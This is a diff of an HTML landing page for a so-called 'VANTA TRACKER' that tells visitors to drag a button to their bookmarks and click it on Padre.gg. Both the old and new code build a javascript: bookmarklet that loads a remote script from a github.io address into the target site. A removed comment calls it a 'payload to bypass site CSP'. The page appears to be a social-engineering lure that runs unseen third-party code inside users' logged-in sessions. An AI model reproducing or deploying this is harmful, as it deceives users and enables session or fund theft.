@@ -7,40 +7,26 @@
     <link rel="icon" href="https://i.ibb.co/zVC2MwL1/Capture-d-cran-2025-11-11-212954.jpg" type="image/png">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #00ff88; --bg: #0a0a0a; }
-        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; margin: 0; overflow: hidden; }
-        .container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; position: relative; z-index: 10; }
-        canvas { position: absolute; top: 0; left: 0; z-index: 1; }
-        h1 { color: var(--primary); font-size: 4rem; margin: 0; text-shadow: 0 0 20px rgba(0,255,136,0.3); }
-        .cta { background: var(--primary); color: #000; padding: 18px 40px; border-radius: 8px; font-weight: 800; text-decoration: none; margin-top: 30px; cursor: move; box-shadow: 0 0 15px var(--primary); }
-        .instructions { margin-top: 20px; color: #aaa; font-size: 0.9rem; }
+        :root { --primary: #00ff88; --bg: #070707; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg); color: #fff; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .box { z-index: 10; text-align: center; border: 1px solid var(--primary); padding: 50px; border-radius: 20px; background: rgba(0,0,0,0.8); backdrop-filter: blur(10px); }
+        h1 { color: var(--primary); font-size: 3.5rem; letter-spacing: -2px; margin: 0; }
+        .btn { display: inline-block; margin-top: 30px; background: var(--primary); color: #000; padding: 20px 50px; border-radius: 50px; font-weight: 800; text-decoration: none; transition: 0.3s; cursor: move; box-shadow: 0 10px 30px rgba(0,255,136,0.2); }
+        .btn:hover { transform: scale(1.05); box-shadow: 0 15px 40px rgba(0,255,136,0.4); }
+        p { color: #666; margin-top: 15px; font-size: 0.8rem; text-transform: uppercase; }
     </style>
 </head>
 <body>
-    <canvas id="bg"></canvas>
-    <div class="container">
+    <div class="box">
         <h1>VANTA TRACKER</h1>
-        <p>Zero-Latency Padre API Intelligence</p>
-        <a href="#" class="cta" id="vanta-btn">VANTA TRACKER</a>
-        <div class="instructions">Drag this button to your bookmarks bar, then click it on Padre.gg</div>
+        <a href="#" class="btn" id="v">ACTIVATE VANTA</a>
+        <p>Drag to Bookmarks • Open Padre • Click</p>
     </div>
 
     <script>
-        // Simple Matrix-style Background
-        const c = document.getElementById("bg");
-        const ctx = c.getContext("2d");
-        c.width = window.innerWidth; c.height = window.innerHeight;
-        function draw() {
-            ctx.fillStyle = "rgba(10,10,10,0.1)"; ctx.fillRect(0,0,c.width,c.height);
-            requestAnimationFrame(draw);
-        }
-        draw();
-
-        // BOOKMARKLET GENERATOR
-        const url = "https://jinxthesimp.github.io/Dropshipper/tracker.js";
-        // Optimized payload to bypass site CSP
-        const code = `javascript:(function(){var s=document.createElement('script');s.src='${url}?v='+Date.now();document.head.appendChild(s);})();`;
-        document.getElementById('vanta-btn').href = code;
+        const u = "https://jinxthesimp.github.io/Dropshipper/tracker.js";
+        const c = `javascript:(function(){var s=document.createElement('script');s.src='${u}?v='+Date.now();document.head.appendChild(s);})();`;
+        document.getElementById('v').href = c;
     </script>
 </body>
 </html>
